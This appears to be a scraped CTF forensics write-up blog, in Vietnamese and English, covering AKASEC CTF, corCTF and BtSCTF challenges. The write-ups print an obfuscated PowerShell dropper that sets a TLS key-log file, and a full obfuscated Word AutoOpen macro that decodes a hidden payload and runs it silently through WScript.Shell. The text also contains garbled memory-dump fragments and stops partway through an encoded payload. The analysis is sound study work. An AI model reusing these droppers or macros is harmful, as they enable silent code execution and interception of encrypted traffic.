-4d85-832a-0fef9b5b7025 https://pastecode.io/s/9oz9u9h4 aa36-fd6c-4d85-832a-0fef9b5b7025 https://pastecode.io/s/9oz9u9h4 \\id=d58faa36-fd6c-4d85-832a-0fef9b5b7025 https://pastecode.io/s/9oz9u9h4ManagedPosition=DeviceId:\\\\?\\DISPLAY#Default_Monitor#4\u0026amp;17f0ff54\u0026amp;0\u0026amp;UID0#{e6f07b5f-ee97-4a90-b076-33f57bf4eaa7};Position=682,50;Size=320,320Yellow26ca61a2-0663-47cf-9ba9-95e61a6be8c10347e22a-acbf-431b-9a0b-6873fdb426ad \\id=d58faa36-fd6c-4d85-832a-0fef9b5b7025 https://pastecode.io/s/9oz9u9h4 \\id=d58faa36-fd6c-4d85-832a-0fef9b5b7025 https://pastecode.io/s/9oz9u9h4ManagedPosition=DeviceId:\\\\?\\DISPLAY#Default_Monitor#4\u0026amp;17f0ff54\u0026amp;0\u0026amp;UID0#{e6f07b5f-ee97-4a90-b076-33f57bf4eaa7};Position=682,50;Size=320,320Yellow26ca61a2-0663-47cf-9ba9-95e61a6be8c10347e22a-acbf-431b-9a0b-6873fdb426ad \\id=d58faa36-fd6c-4d85-832a-0fef9b5b7025 https://pastecode.io/s/9oz9u9h4 \\id=d58faa36-fd6c-4d85-832a-0fef9b5b7025 https://pastecode.io/s/9oz9u9h4 \\id=d58faa36-fd6c-4d85-832a-0fef9b5b7025 https://pastecode.io/s/9oz9u9h4 \\id=d58faa36-fd6c-4d85-832a-0fef9b5b7025 https://pastecode.io/s/9oz9u9h4ManagedPosition=DeviceId:\\\\?\\DISPLAY#Default_Monitor#4\u0026amp;17f0ff54\u0026amp;0\u0026amp;UID0#{e6f07b5f-ee97-4a90-b076-33f57bf4eaa7};Position=682,50;Size=320,320Yellow26ca61a2-0663-47cf-9ba9-95e61a6be8c10347e22a-acbf-431b-9a0b-6873fdb426ad \\id=d58faa36-fd6c-4d85-832a-0fef9b5b7025 https://pastecode.io/s/9oz9u9h4 \\id=d58faa36-fd6c-4d85-832a-0fef9b5b7025 https://pastecode.io/s/9oz9u9h4 \\id=d58faa36-fd6c-4d85-832a-0fef9b5b7025 https://pastecode.io/s/9oz9u9h4 Sau khi mở nó lên bằng pass đã tìm được: Copy vào Cyberchef, mình biết được nó là 1 file zip. Down nó xuống. Tuy nhiên file zip này yêu cầu pass.Mình crack nó bằng john nhưng không thành công. Nên mình thử mở lại file memdump và để ý thằng notepad.exe. Mình dùng plugin notepad của vol3.\n192.168.117.12 = ncal ncal pc epmapper epmapper epmapper er epmapper ncal epmapper epmapper ncalrpc \\R MACHINE\\ ware \u0026amp; \\Win ndation. ecti \u0026amp; A TSA: \u0026amp; \u0026amp; @ Windows.Security.EnterpriseData.ProtectionPolicyManagerPrivatePT !\u0026#34; % \\ l H % % \\ l H % p % ( @ @ 9 9# WIN10 10.0.2.15 192.168.117.12 Q Negotiate NegoExtender Kerberos NTLM TSSSP pku2u Schannel a \\ l H \\ l H 8 8 8 @ @ *Sans titre - Bloc-notes IN10 x % ( 9# WIN10 10.0.2.15 192.168.117.12 x % *Sans titre - Bloc-notes *Sans titre - Bloc-notes * -+ncalrpc:[OLEDFD5E635AC231E044AAE20E7BBFB] % % % @ ) pku2u \\RPC T Ln 1, Col 1 lsapolicylookup NTLM TSSSP \\RPC Windows (CRLF) Ptype_PSFactory T C:\\Windows\\INF C:\\Windows\\SYSTEM WIN10 PS C:\\Windows\\system32 in lasses\\A I 8 $ ine\\Software\\Classes\\AppID\\notepad.exe 43-1000 \\AppID\\notepad.exe 8 WIN10 % $ 9 % 9587-4227533743-1000_Classes 8 \\REGISTRY\\MACHINE\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\LanguagePack\\SurrogateFallback \\Registry\\Machine\\SOFTWARE\\Microsoft\\AppModel\\Lookaside\\machine\\Software\\Microsoft\\OLE\\Tracing q Model\\Lookaside\\user\\software\\Classes\\AppID\\notepad.exe 8 ` ` 8 9-8740 @ 8 This is the password for the zip containing all the importante data : Samaqlo@Akasex777 8 \\ WIN10 samaqlo 8 L H D \u0026#34; % C 93 ` 32 8 \\REGISTRY\\MACHINE\\SOFTWARE\\Classes\\CLSID\\{11659a23-5884-4d1b-9cf6-67d6f4f90b36} \\REGISTRY\\MACHINE\\SOFTWARE\\Classes\\CLSID\\{b5f8350b-0548-48b1-a6ee-88bd00b4a5e7} \\REGISTRY\\MACHINE\\SOFTWARE\\Classes\\CLSID\\{b5f8350b-0548-48b1-a6ee-88bd00b4a5e7} \\REGISTRY\\MACHINE\\SOFTWARE\\Classes\\CLSID\\{b5f8350b-0548-48b1-a6ee-88bd00b4a5e7} % \u0026gt; Barre d tat Barre d tat xte C:\\Windows\\system32\\DRIVERS MSCTFIME::Function Provider MSAA AccPropServices Pass sẽ là Samaqlo@Akasex777. Sau đó ta được 1 file ảnh. Sau một lúc thì mình mở được nó bằng stegseek và tìm được flag.\nFLAG: AKASEC{05-10-2023_free_palestine}\n5.For/Sharing not Caring # My friends and I use the same computer on campus and have a shared folder to exchange files. After submitting the flag for the challenge, it was leaked, and someone obtained it without my knowledge. I\u0026rsquo;m unsure how they got it. Author : d33znu75\nChallenge cung cấp cho mình 1 file pcapng và 1 file ad1. Mình mở thử wireshark để xem có gì có thể extract từ file pcapng không. Từ Export Objects -\u0026gt; HTTP mình thấy có 1 file sau: Mình click vào file đầu tiên để xem nó nằm ở luồng nào. Follow luồng để xem kĩ hơn: Mình để ý rằng nó download 1 file exe từ Mediafire.Tuy nhiên, mình thử dùng cả máy ảo và host nhưng đều không tải được. Sau đó mình tìm được video này và tải nó xuống thành công. Dùng DIE kiểm tra:\n┌──(kali㉿kali)-[~/Downloads] └─$ diec FREE\\ RAM\\!.exe --heuristicscan [!] To get the full heuristic scan result use \u0026#39;--verbose\u0026#39; [HEUR/About] Generic Heuristic Analysis by DosX (@DosX_dev) [HEUR] Scanning has begun! [HEUR/.NET] ByteCode detected: 20????????66 [HEUR/.NET] Object present: Debugger [HEUR] Scan completed. PE32 Linker: Microsoft Linker(11.0) Library: .NET Framework(Legacy, CLR v4.0.30319) Packer: PS2EXE (Heur)Packer: Packer detected 1 file .NET. Dùng ILSpy để decompile nó ra, mình chú ý đến file free_raw.ps1 trong phần Resources:\n┌──(kali㉿kali)-[~/Downloads] └─$ cat free_raw.ps1 $best64code = \u0026#34;iQWZ0N3bvJGIlJGIuF2Yg0WYyBybuBiLlV3czlGIsF2Yp5GajVGdgI3bmBSeyJ3bzJCIy9mcyVULlRXaydlCNoQDpcSZulGajFWTnACLlxWaGd2bMlXZLx2czRCIscSRMlkRH9ETZV0SMN1UngSZsJWYpJXYWRnbl1mbvJXa25WR0V2U6oTX05WZt52bylmduVkLtVGdzl3UbpQDK0QfK0QZslmRgUGc5RVblRXStASZslmRn9GT5V2SsN3ckACa0FGUtASblRXStcXZOBCIgAiCNsHIpkSZslmRn9GT5V2SsN3ckACa0FGUtQ3clRFKgQ3bu1CKgYWaK0gCNoQDic2bs5SeltGbzNHXr5WacBVVOdUSTxlclJ3bsBHeFBCdl5mclRnbJx1c05WZtV3YvREXjlGbiVHUcNnclNXVcpzQiASPgUGbpZ0ZvxUeltEbzNHJ\u0026#34; ; $base64 = $best64code.ToCharArray() ; [array]::Reverse($base64) ; -join $base64 2\u0026gt;\u0026amp;1\u0026gt; $null ; $LOADCode = [System.text.EnCOdING]::UTF8.getsTRiNg([sysTEm.coNvErT]::FromBASe64stRInG(\u0026#34;$BaSe64\u0026#34;)) ; $PWN = \u0026#34;Inv\u0026#34;+\u0026#34;Oke\u0026#34;+\u0026#34;-ex\u0026#34;+\u0026#34;prE\u0026#34;+\u0026#34;SsI\u0026#34;+\u0026#34;ON\u0026#34; ; nEW-aLIas -naMe PWN -ValuE $pWN -foRce ; pwn $lOadCODe ; Ban đầu mình decode nó bằng base64 nhưng báo lỗi. Sau đó mình để ý đến hàm rev, giờ chỉ cần đảo ngược lại và decode lại, ta được đoạn mã sau:\n$sslKeyLogFile = \u0026#34;C:\\Users\\Public\\Documents\\Internet Explorer\\SIGNUP\\ink\\sslkey.log\u0026#34; if (-not (Test-Path $sslKeyLogFile)) { New-Item -Path $sslKeyLogFile -ItemType File } [System.Environment]::SetEnvironmentVariable(\u0026#39;SSLKEYLOGFILE\u0026#39;, $sslKeyLogFile, \u0026#39;Machine\u0026#39;) Write-Error \u0026#34;sorry for technical issue. no ram can be boosted Giờ là lúc ta mở file ad1. Mình dùng FTKImage, sau đó extract ra. Check theo đường dẫn ta tìm được file sslkey.log. Giờ chỉ cần load nó vào file pcapng. Đây là hướng dẫn cụ thể. Giải thích cho việc load file sslkey vào thì khi ta mở Wireshark có thể thấy 1 số file TLS 1.3v. Sau đó dùng công cụ tìm kiếm trong Wireshark và ta tìm thấy cờ: FLAG: AKASEC{B4s1c_M4lw4r3_4nd_PC4P_4n4lys1s}\n","date":"30 August 2024","externalUrl":null,"permalink":"/posts/akasecctf/","section":"Posts","summary":"\u003ch2 class=\"relative group\"\u003e1.For/Portugal \n    \u003cdiv id=\"1forportugal\" class=\"anchor\"\u003e\u003c/div\u003e\n    \n    \u003cspan\n        class=\"absolute top-0 w-6 transition-opacity opacity-0 ltr:-left-6 rtl:-right-6 not-prose group-hover:opacity-100\"\u003e\n        \u003ca class=\"group-hover:text-primary-300 dark:group-hover:text-neutral-700\"\n            style=\"text-decoration-line: none !important;\" href=\"#1forportugal\" aria-label=\"Anchor\"\u003e#\u003c/a\u003e\n    \u003c/span\u003e        \n    \n\u003c/h2\u003e\n\u003cblockquote\u003e\n\u003cp\u003eI accidentally left my computer unlocked at the coffee shop while I stepped away. I\u0026rsquo;m sure that someone took advantage of the opportunity and was searching for something.\nAuthor : d33znu75\u003c/p\u003e","title":"AKASEC CTF","type":"posts"},{"content":" 1. For/The-conspirasy # Challenge give me 2 files : one is pcap, one is python code. I tried opening the pcap file to see what was there. At first glance, it contained TCP streams containing data in the form [x,y,z \u0026hellip;] with 2 types including numbers less than or equal to 100 and large numbers with 3 or more digits.\nRead the python code file further. That\u0026rsquo;s a way to encode and send data.\nimport csv sources, destinations, messages = [], [], [] with open(\u0026#39;chatlogs.csv\u0026#39;, mode=\u0026#39;r\u0026#39;) as file: csv_reader = csv.reader(file) for row in csv_reader: sources.append(row[0]) destinations.append(row[1]) messages.append(row[2]) def encrypt(message): messagenums = [] for character in message: messagenums.append(ord(character)) keys = [] for i in range(len(messagenums)): keys.append(random.randint(10, 100)) finalmessage = [] for i in range(len(messagenums)): finalmessage.append(messagenums[i] * keys[i]) return keys, finalmessage for i in range(len(messages)): finalmessage, keys = encrypt(messages[i]) print(finalmessage, keys) packet1 = IP(src=sources[i], dst=destinations[i])/TCP(dport=80)/Raw(load=str(finalmessage)) send(packet1) packet2 = IP(src=sources[i], dst=destinations[i])/TCP(dport=80)/Raw(load=str(keys)) send(packet2) The code performs three steps: 1 - Read data from CSV file: - Open chatlogs.csv. - Read rows from CSV file and save values ​​to sources, destinations, and messages. 2 - Encrypt function: - Convert each character in message to ASCII code and save to messagenums. - Create a list of keys containing random numbers from 10 to 100. - Encrypt the message by multiplying each ASCII value in messagenums by the corresponding key in keys. 3 - Send encrypted message and encryption key over the network: - For each message in messages, encrypt the message. - Create two packets: + The first packet contains the encrypted message (finalmessage). + The second packet contains the encryption keys (keys). - Send these packets over the network to their respective destinations using Scapy. To decode and get the original data, we do 2 steps: First, take the encrypted value and divide it by the key to get the original value, then convert the value from the corresponding ASCII value.Extract raw data from pcap file using tshark (I will find a way to filter it faster). tshark -r challenge.pcap -Y \u0026#34;tcp\u0026#34; -T fields -e tcp.payload \u0026gt; chatlogs.csv. Then simply decode hex, filter them into 2 files and use code to decode them. This my code to filter (after decode hex value). import re def process_lines(input_file, file_greater_than_500, file_less_than_or_equal_500): with open(input_file, \u0026#39;r\u0026#39;) as file: lines = file.readlines() with open(file_greater_than_500, \u0026#39;w\u0026#39;) as file1, open(file_less_than_or_equal_500, \u0026#39;w\u0026#39;) as file2: for line in lines: numbers = re.findall(r\u0026#39;\\d+\u0026#39;, line) if any(int(num) \u0026gt; 500 for num in numbers): file1.write(line) else: file2.write(line) process_lines(\u0026#39;chatlogs.csv\u0026#39;, \u0026#39;1.txt\u0026#39;, \u0026#39;2.txt\u0026#39;) And this is decrypt code : def decrypt(finalmessage, keys): original_message = [] for i in range(len(finalmessage)): original_char_code = finalmessage[i] // keys[i] original_message.append(chr(original_char_code)) return \u0026#39;\u0026#39;.join(original_message) def read_numbers_from_file(filename): numbers = [] with open(filename, \u0026#39;r\u0026#39;) as file: for line in file: line = line.strip() line = line.replace(\u0026#39;[\u0026#39;, \u0026#39;\u0026#39;).replace(\u0026#39;]\u0026#39;, \u0026#39;\u0026#39;).replace(\u0026#39; \u0026#39;, \u0026#39;\u0026#39;) if line: numbers.extend(map(int, line.split(\u0026#39;,\u0026#39;))) return numbers finalmessage = read_numbers_from_file(\u0026#39;1.txt\u0026#39;) keys = read_numbers_from_file(\u0026#39;2.txt\u0026#39;) print(decrypt(finalmessage, keys)) FLAG : corctf{b@53d_af_f0r_th3_w1n}\n2. For/Ilfiltration # The challenge requires answering some questions to get the flag, the challenge file is an event logs file. Since I am not familiar with using chainsaw, I only use 2 tools here, event viewer and EVTXeCMD.\nQ1: We'd like to confirm what the username of the main user on the target's computer is. Can you provide this information? ANSWER: slice1\nSOLVE: Just go through some facts and we will have the answer to this question or check EID: 4798 (User\u0026rsquo;s local group membership was enumerated.)\nQ2: Now, we'd like the name of the computer, after it was renamed. Ensure that it is entered in exactly how it is in the logs ANSWER: lemon-squeezer\nSOVLE: We can see it in EID 4673 (A privileged service was called) or other, like Q1.\nQ3: Great work! In order to prevent their lemons from moulding, the lemonthinkers changed the maximum password age. What is this value? Please enter it as an integer number in days\nANSWER: 83\nSOLVE: Check EID 4739 (Domain Policy was changed). Actually I didn\u0026rsquo;t check EID 4739 immediately, I used another way which is to use EVTXeCMD to convert the evtx file to a csv file, then grep \u0026ldquo;age\u0026rdquo;. You can see the 2 numbers are 42 and 83, but the correct answer is 83. Check the evtx file just to be sure.\nQ4: It seems that our targets are incredibly smart, and turned off the antivirus. At what time did this happen? Give your answer as a UNIX timestamp\nANSWER: 1721946080\nSOLVE: This was a question that I was pretty clueless about. So when a member of my team answered it first, I knew I needed to check EID 4699 (A scheduled task was deleted) We can see here, in my local time it is 5:21:20 AM on the 26th, converted to UTC it is 22:21:20 on the 25th. Then just use Epoch Converter to convert to Unix time.\nQ5: The main lemonthinker, slice1, hasn't learnt from the-conspiracy and has (again) downloaded some malware on the system. What is the name of the user created by this malware? ANSWER: notabackdoor\nSOLVE: Check EID 4672 (Special privileges assigned to new logon), we can see it in first line. Q6: Finally, we'd like to know the name of the group that the user created by the malware is part of, which has the greatest security risk. What is this?\nANSWER: Administrator\nSOLVE: In this ques, i use Timeline Explorer and filter Username=notabackdoor, we can see in EID 4672 line : Administrative logon, so the answer is Administrator. FLAG: corctf{alw4y5_l3m0n_7h1nk_b3f0r3_y0u_c0mm1t_cr1m3}\n","date":"30 July 2024","externalUrl":null,"permalink":"/posts/corctf/","section":"Posts","summary":"\u003ch2 class=\"relative group\"\u003e1. For/The-conspirasy \n    \u003cdiv id=\"1-forthe-conspirasy\" class=\"anchor\"\u003e\u003c/div\u003e\n    \n    \u003cspan\n        class=\"absolute top-0 w-6 transition-opacity opacity-0 ltr:-left-6 rtl:-right-6 not-prose group-hover:opacity-100\"\u003e\n        \u003ca class=\"group-hover:text-primary-300 dark:group-hover:text-neutral-700\"\n            style=\"text-decoration-line: none !important;\" href=\"#1-forthe-conspirasy\" aria-label=\"Anchor\"\u003e#\u003c/a\u003e\n    \u003c/span\u003e        \n    \n\u003c/h2\u003e\n\u003cul\u003e\n\u003cli\u003e\n\u003cp\u003eChallenge give me 2 files : one is pcap, one is python code. I tried opening the pcap file to see what was there. At first glance, it contained TCP streams containing data in the form [x,y,z \u0026hellip;] with 2 types including numbers less than or equal to 100 and large numbers with 3 or more digits.\u003c/p\u003e","title":"corCTF","type":"posts"},{"content":" 1.For/freeflag # Thử thách cung cấp cho ta 1 file pcapng. Mình mở nó bằng Wireshark thì thấy có 1 luồng có thông tin như sau:\nGET /secretfiles/freeflag.docm HTTP/1.1 Host: 192.168.56.1:1337 User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:123.0) Gecko/20100101 Firefox/123.0 Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8 Accept-Language: en-US,en;q=0.5 Accept-Encoding: gzip, deflate Connection: keep-alive Upgrade-Insecure-Requests: 1 Mình extract file docm ra bằng cách dùng: File \u0026gt; Export Objects \u0026gt; HTTP. Load file vào VirusTotal: Như với mọi bài có .docm khác, mình dùng olevba để xem macro của nó.\nFunction XUX8BlCUMq5KoK8(lXKWfCUl1zmltYi() As Byte) As Byte() Dim EMtQJsAKYNXvFOd() As Byte ReDim EMtQJsAKYNXvFOd(UBound(lXKWfCUl1zmltYi)) Dim nF7o4G7ab45k7fe(4) As Byte nF7o4G7ab45k7fe(0) = 222 nF7o4G7ab45k7fe(1) = 173 nF7o4G7ab45k7fe(2) = 190 nF7o4G7ab45k7fe(3) = 239 Dim HSnocyKymDfeVtw As Long For HSnocyKymDfeVtw = LBound(lXKWfCUl1zmltYi) To UBound(lXKWfCUl1zmltYi) EMtQJsAKYNXvFOd(HSnocyKymDfeVtw) = lXKWfCUl1zmltYi(HSnocyKymDfeVtw) Xor nF7o4G7ab45k7fe(HSnocyKymDfeVtw Mod 4) Xor \u0026amp;HBB Next HSnocyKymDfeVtw XUX8BlCUMq5KoK8 = EMtQJsAKYNXvFOd End Function Function BBjijsT7pS60iwZ(str As String) As Byte() Dim nrKM9I07nhiFKOO() As String Dim GHebfca2sCJaoCG() As Byte Dim vgrs5jtmF1aXSJF As Long nrKM9I07nhiFKOO = Split(str, \u0026#34;,\u0026#34;) ReDim GHebfca2sCJaoCG(LBound(nrKM9I07nhiFKOO) To UBound(nrKM9I07nhiFKOO)) For vgrs5jtmF1aXSJF = LBound(nrKM9I07nhiFKOO) To UBound(nrKM9I07nhiFKOO) GHebfca2sCJaoCG(vgrs5jtmF1aXSJF) = CByte(Trim(nrKM9I07nhiFKOO(vgrs5jtmF1aXSJF))) Next vgrs5jtmF1aXSJF BBjijsT7pS60iwZ = GHebfca2sCJaoCG End Function Sub AutoOpen() Dim TP2lyf5wJk5RfdK As InlineShape Set TP2lyf5wJk5RfdK = ActiveDocument.InlineShapes(1) Dim ovVApsD7tsHJaAV() As Byte ovVApsD7tsHJaAV = BBjijsT7pS60iwZ(TP2lyf5wJk5RfdK.AlternativeText) KKPSYRKShOsPgGt = XUX8BlCUMq5KoK8(ovVApsD7tsHJaAV) Dim txsptBa4S5TwPSY As String txsptBa4S5TwPSY = StrConv(KKPSYRKShOsPgGt, vbUnicode) Dim o4LCufGQYESakcZ As Object Set o4LCufGQYESakcZ = CreateObject(\u0026#34;WScript.Shell\u0026#34;) o4LCufGQYESakcZ.Run txsptBa4S5TwPSY, 0, True MsgBox \u0026#34;BtSCTF{LEGIT_FREE_FLAG_OMG}\u0026#34; End Sub Đại khái nó như sau:\n1. Hàm XUX8BlCUMq5KoK8(): - Hàm này nhận vào một mảng byte (Byte()) và thực hiện phép XOR từng phần tử với các giá trị trong một mảng cố định gồm 4 byte: 222, 173, 190, 239 (đây là một giá trị của magic number trong hex thường được gọi là \u0026#34;DEADBEEF\u0026#34;). - Mỗi byte của mảng đầu vào còn được XOR thêm với giá trị cố định \u0026amp;HBB (187 trong hệ thập phân). - Sau đó, mảng đã XOR được trả về. 2. Hàm BBjijsT7pS60iwZ(): - Hàm này chuyển đổi một chuỗi ký tự đầu vào (dạng chuỗi chứa các số, phân cách bởi dấu phẩy) thành một mảng byte. - Nó cắt chuỗi thành từng số, chuyển đổi mỗi số thành byte, và trả về mảng các byte này. 3. Hàm Sub AutoOpen(): - Kích hoạt tự động khi tài liệu được mở - TP2lyf5wJk5RfdK được gán là hình ảnh nhúng đầu tiên trong tài liệu Word. - Văn bản thay thế (Alternative Text) của hình ảnh này được lấy ra và chuyển đổi thành một mảng byte nhờ hàm BBjijsT7pS60iwZ. - Mảng byte này sau đó được giải mã bằng cách sử dụng hàm XUX8BlCUMq5KoK8. - Chuỗi kết quả được chuyển đổi thành Unicode và lưu trong biến txsptBa4S5TwPSY. - Cuối cùng, chuỗi này được thực thi bằng cách sử dụng WScript.Shell. Để giải mã đoạn macro này, ta cần lấy chuỗi AlternativeText từ hình ảnh trong file .docm. Vì dùng kali nên mình không tìm thấy cách nào thực hiện được điều đó ngoài sử dụng Python.\nimport zipfile def extract_alternative_text_from_docm(docm_path): with zipfile.ZipFile(docm_path, \u0026#39;r\u0026#39;) as docm_file: for file_name in docm_file.namelist(): if \u0026#39;word/document.xml\u0026#39; in file_name: document_xml = docm_file.read(file_name).decode(\u0026#39;utf-8\u0026#39;) print(\u0026#34;Document.xml content found.\u0026#34;) return document_xml print(\u0026#34;Document.xml not found.\u0026#34;) return None docm_path = \u0026#39;freeflag.docm\u0026#39; document_content = extract_alternative_text_from_docm(docm_path) if document_content: print(document_content) Ta có được chuỗi Alternative:\n21,121,114,49,23,101,109,49,9,122,37,121,38,121,104,57,4,120,97,116,71,95,107,34,10,125,96,121,38,121,104,57,4,120,97,116,72,69,102,38,12,102,113,22,9,121,102,63,69,109,33,98,2,79,108,22,4,92,107,0,52,117,72,21,55,111,37,105,69,74,39,101,92,36,43,101,83,46,43,97,83,56,52,8,71,45,33,16,39,80,114,39,18,126,98,13,46,120,70,35,29,92,37,105,69,62,52,102,86,47,50,96,69,59,37,101,80,36,53,103,85,54,46,116,87,46,61,99,81,54,46,116,80,39,60,125,94,50,66,4,8,122,72,96,44,33,73,2,54,67,74,109,17,54,56,116,77,74,39,47,86,107,126,101,24,109,49,41,30,35,120,47,85,107,126,102,24,74,39,121,3,49,97,97,66,58,34,48,92,49,41,115,1,36,34,120,66,114,60,115,73,49,97,49,66,58,34,55,92,49,44,111,65,47,61,1,29,65,71,1,93,119,92,96,42,92,67,30,69,43,37,15,54,111,118,32,0,123,43,0,0,110,113,122,32,120,102,59,1,127,107,51,56,44,63,1,49,80,61,111,3,99,107,55,17,127,106,58,69,91,71,109,32,68,83,50,92,100,108,26,55,123,112,35,69,109,117,53,23,119,104,116,77,77,103,45,17,115,94,9,56,54,33,32,15,124,104,101,29,79,98,96,31,92,108,58,51,95,44,111,65,82,93,6,33,64,54,19,47,115,64,99,2,121,107,49,69,43,37,26,0,97,40,27,7,124,96,55,17,54,103,45,17,115,94,9,69,50,113,62,15,123,52,44,60,113,49,46,47,127,107,2,44,56,73,49,11,113,113,60,94,50,113,97,18,92,87,13,9,99,111,99,1,38,108,49,51,54,56,116,84,37,62,50,10,100,37,124,65,67,66,16,13,126,74,54,20,117,52,18,47,39,83,63,69,43,37,100,94,54,33,1,34,82,109,60,42,116,116,55,84,80,79,101,51,125,37,121,9,98,37,112,17,124,111,57,84,110,92,51,81,108,79,61,11,64,76,122,41,115,107,51,17,126,62,112,48,81,65,60,13,89,103,37,6,39,67,30,84,64,110,127,78,63,37,47,65,82,93,6,33,64,54,19,47,115,64,99,2,121,107,49,62,50,80,19,33,126,109,27,7,103,102,101,35,92,52,2,14,75,37,105,69,50,113,62,15,123,52,44,60,113,49,46,47,127,107,2,44,77,33,1,34,82,109,60,42,116,116,55,84,80,79,101,51,125,88,116,72,116,125,59,23,54,33,32,80,97,79,6,60,122,112,62,82,114,53,61,0,64,62,112,17,35,114,30,55,79,105,33,15,33,97,100,12,115,83,116,88,54,33,32,80,97,79,6,60,122,112,62,82,114,53,61,0,64,37,121,7,110,106,38,69,37,50,116,72,116,125,59,23,54,45,112,48,81,65,60,13,89,103,37,6,39,67,30,84,64,110,116,64,54,53,44,39,84,44,116,24,45,119,49,17,99,119,58,69,50,65,12,55,82,83,103,34,92,96,17,82,113,106,58,0,107,62,15,7,111,113,49,62,75,88,116,65,80,67,36,20,123,86,18,4,116,109,58,22,36,61,102,69,43,37,98,82,58,48,108,73,47,55,120,93,33,41,101,85,35,41,101,84,38,41,101,85,38,41,101,84,39,41,101,84,47,41,101,84,35,41,109,87,58,50,99,73,39,53,97,73,47,60,120,84,39,49,120,84,39,52,120,84,39,48,120,84,39,52,120,84,38,55,120,84,39,51,120,81,32,41,99,93,58,51,109,73,46,49,120,92,36,41,99,85,58,52,101,81,58,60,99,73,39,53,109,73,39,53,101,73,39,52,109,73,39,52,101,73,39,52,96,73,39,53,99,94,50,93,37,21,94,51,37,6,126,127,5,31,110,100,29,9,54,56,116,77,113,102,61,69,62,33,109,93,67,125,3,39,67,61,53,60,34,74,30,35,92,43,19,0,98,86,32,23,127,107,51,77,50,67,18,21,103,104,7,35,119,103,60,11,101,55,108,87,63,44,116,72,68,37,121,35,127,37,124,57,52,126,96,24,109,51,41,30,39,120,47,86,107,126,97,24,109,55,41,30,38,120,8,71,54,40,50,69,49,96,115,73,49,102,115,73,49,125,115,73,49,43,115,73,49,102,115,73,49,96,115,73,49,118,115,76,63,62,61,3,54,45,112,11,99,105,56,69,59,96,37,69,50,93,37,21,94,51,37,6,126,127,5,31,110,100,29,9,56,64,44,12,101,113,39,76,54,126,49,29,127,113,41,69,115,105,39,0,54,126,112,61,103,117,28,83,103,102,60,31,71,127,44,4,95,105,116,88,54,33,12,20,102,77,98,20,117,109,46,52,108,125,53,44,122,43,18,16,122,105,26,4,123,96,41,94,50,81,13,51,110,71,61,54,88,50,24,60,70,52,22,86,54,56,116,77,127,114,38,69,74,39,112,30,32,98,13,12,84,100,30,11,66,84,55,40,87,87,45,24,44,33,47,33,84,67,35,22,97,109,51,60,93,107,23,18,110,79,41,74,50,126,19,53,123,105,25,81,95,50,24,51,69,80,27,92,98,120,8,71,54,40,1,22,115,71,53,22,127,102,4,4,100,118,61,11,113,44,122,38,121,107,32,0,120,113,111,65,66,92,2,29,84,108,7,43,33,73,13,53,39,71,103,69,43,37,25,39,47,64,6,51,112,60,38,12,88,87,57,16,97,37,112,49,79,83,44,39,127,86,26,82,90,92,4,84,84,54,111,65,32,99,26,38,82,64,53,35,123,71,109,9,117,74,51,69,43,37,8,71,50,126,17,11,96,63,0,32,91,85,41,57,115,100,109,93,117,111,57,0,74,39,111,65,80,103,4,44,82,74,98,85,121,100,58,20,82,50,63,69,43,37,8,71,57,106,33,17,44,33,47,32,120,115,110,49,83,72,4,24,74,96,53,92,46,102,62,8,115,43,49,29,115,89,118,94,69,96,32,72,85,106,58,17,115,107,32,69,59,85,53,17,126,37,112,83,112,75,23,33,83,100,18,8,84,60,56,6,89,98,116,72,64,100,56,16,115,37,112,49,79,83,44,39,127,86,26,82,90,92,4,84,84,54,116,72,83,107,55,10,114,108,58,2,54,71,45,17,115,37,121,43,121,75,49,18,122,108,58,0,45,35,116,65,78,116,36,45,32,116,55,13,108,84,46,29,119,76,56,69,50,67,54,53,95,65,27,83,38,106,53,11,103,65,99,14,54,33,98,3,88,70,16,32,119,67,57,39,47,105,55,42,113,62,114,69,74,39,112,30,83,107,34,95,66,64,25,53,107,89,49,4,47,61,55,15,123,96,122,0,110,96,8,71,45,119,57,69,50,51,50,43,85,65,17,4,80,104,22,92,122,102,27,2,107,39 Viết code để thực hiện bước XOR của Macro:\ndef xux8blcummq5kok8(byte_array): nF7o4G7ab45k7fe = [222, 173, 190, 239] emtqjsakynxvfod = bytearray(len(byte_array)) for i in range(len(byte_array)): emtqjsakynxvfod[i] = byte_array[i] ^ nF7o4G7ab45k7fe[i % 4] ^ 0xBB return emtqjsakynxvfod def bbjijst7pS60iwz(s): byte_values = [int(val.strip()) for val in s.split(\u0026#39;,\u0026#39;)] return bytearray(byte_values) def main(alternative_text): byte_array = bbjijst7pS60iwz(alternative_text) result = xux8blcummq5kok8(byte_array) with open(\u0026#39;output.bin\u0026#39;, \u0026#39;wb\u0026#39;) as f: f.write(result) return result alternative_text = \u0026#34;21,121,114,49,23,101,109,49,9,122,37,121,38,121,104,57,4,120,97,116,71,95,107,34,10,125,96,121,38,121,104,57,4,120,97,116,72,69,102,38,12,102,113,22,9,121,102,63,69,109,33,98,2,79,108,22,4,92,107,0,52,117,72,21,55,111,37,105,69,74,39,101,92,36,43,101,83,46,43,97,83,56,52,8,71,45,33,16,39,80,114,39,18,126,98,13,46,120,70,35,29,92,37,105,69,62,52,102,86,47,50,96,69,59,37,101,80,36,53,103,85,54,46,116,87,46,61,99,81,54,46,116,80,39,60,125,94,50,66,4,8,122,72,96,44,33,73,2,54,67,74,109,17,54,56,116,77,74,39,47,86,107,126,101,24,109,49,41,30,35,120,47,85,107,126,102,24,74,39,121,3,49,97,97,66,58,34,48,92,49,41,115,1,36,34,120,66,114,60,115,73,49,97,49,66,58,34,55,92,49,44,111,65,47,61,1,29,65,71,1,93,119,92,96,42,92,67,30,69,43,37,15,54,111,118,32,0,123,43,0,0,110,113,122,32,120,102,59,1,127,107,51,56,44,63,1,49,80,61,111,3,99,107,55,17,127,106,58,69,91,71,109,32,68,83,50,92,100,108,26,55,123,112,35,69,109,117,53,23,119,104,116,77,77,103,45,17,115,94,9,56,54,33,32,15,124,104,101,29,79,98,96,31,92,108,58,51,95,44,111,65,82,93,6,33,64,54,19,47,115,64,99,2,121,107,49,69,43,37,26,0,97,40,27,7,124,96,55,17,54,103,45,17,115,94,9,69,50,113,62,15,123,52,44,60,113,49,46,47,127,107,2,44,56,73,49,11,113,113,60,94,50,113,97,18,92,87,13,9,99,111,99,1,38,108,49,51,54,56,116,84,37,62,50,10,100,37,124,65,67,66,16,13,126,74,54,20,117,52,18,47,39,83,63,69,43,37,100,94,54,33,1,34,82,109,60,42,116,